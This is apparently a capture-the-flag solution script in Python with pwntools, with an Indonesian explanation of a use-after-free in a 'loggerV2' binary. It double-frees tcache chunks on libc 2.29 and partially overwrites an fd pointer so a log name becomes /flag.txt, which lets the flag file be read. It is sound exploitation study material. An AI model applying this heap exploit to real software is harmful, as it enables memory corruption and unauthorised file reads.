"""
Vuln terdapat pada line 90. Saat log akan ditulis, program mengecek apakah konten merupakan pointer null atau bukan
jika bukan, maka content akan difree dan address heap baru akan dialokasikan.
Namun, jika kita memasukkan size content yang invalid, maka content tetap difree, namun pointernya tidak di-null-kan
Hal ini menyebabkan vuln Use After Free. Kita bisa melakukan double free jika salah memasukkan size pada log content yang sama.

karena terdapat fungsi read_saved_log kita bisa mengoverwrite nilai di logName dengan nilai /flag.txt, kemudian membaca flag dengan fungsi ini.
Untuk melakukan double free di libc 2.29, pertama-tama kita free 7 (atau lebih) heap chunk untuk memenuhi Tchace.
Kemudian lakukan double free dan overwrite byte terakhir fd address pada chunk terakhir agar mengarah ke heap chunk yang menyimpan logName.
Lalu kita bisa mengoverwrite nilai logName dengan /flag.txt
"""


from pwn import *

# r = process("./loggerV2")
# attach(r, '''
# b*0x00005555555557e1
# c
# ''')

r = remote('0.0.0.0', 4000)

def create_log(size, name):
    r.sendlineafter("> ", "1")
    r.sendlineafter(": ", str(size))
    r.sendlineafter(": ", name)

def write_log(inx, size, content):
    r.sendlineafter("> ", "2")
    r.sendlineafter(": ", str(inx))
    r.sendlineafter(": ", str(size))
    r.sendlineafter("content\n", content)

def write_fail(inx):
    r.sendlineafter("> ", "2")
    r.sendlineafter(": ", str(inx))
    r.sendlineafter(": ", "1000")

def delete_log(inx):
    r.sendlineafter("> ", "5")
    r.sendlineafter(": ", str(inx))

def save_log(inx):
    r.sendlineafter("> ", "3")
    r.sendlineafter(": ", str(inx))

def read_saved_log(inx):
    r.sendlineafter("> ", "4")
    r.sendlineafter(": ", str(inx))
    r.recvuntil('Content :\n')
    return r.recvline()

# create heap chunk
for i in range(6): # 0 - 5
    create_log(100, 'AAA'+str(i))
    write_log(i, 105, 'ASDF'+str(i))

# fill Tchace
for i in range(4): # 0 - 3
    delete_log(i)

# doubel free
write_fail(4) # 4
write_fail(5) # 5
write_fail(4) # 4

# Overwrite last LSB fd pointer
for i in range(4): # 0 - 3
    create_log(100, 'AAAA'+str(i))
    write_log(i, 105, '')

# overwrite logName with /flag.txt (with '/' padding)
create_log(100, 'AAAAA') # 6 -> 4
create_log(100, 'AAAAA1') # 7 -> 5
write_log(6, 105, "/"*50 + "flag.txt") # -> 4

# read /flag.txt
print read_saved_log(6)

r.sendlineafter("> ", "6")
r.close()
# r.interactive()